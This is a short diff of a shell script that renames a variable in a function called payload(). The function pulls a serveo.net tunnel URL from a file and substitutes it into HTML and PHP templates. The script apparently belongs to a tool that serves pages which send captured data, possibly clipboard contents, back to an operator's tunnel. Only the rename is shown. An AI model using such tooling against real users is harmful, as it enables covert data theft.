@@ -218,10 +218,10 @@ fi
 
 payload() {
 
-link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$link'+g' cliptext.html > index2.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$send_link'+g' cliptext.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
 }
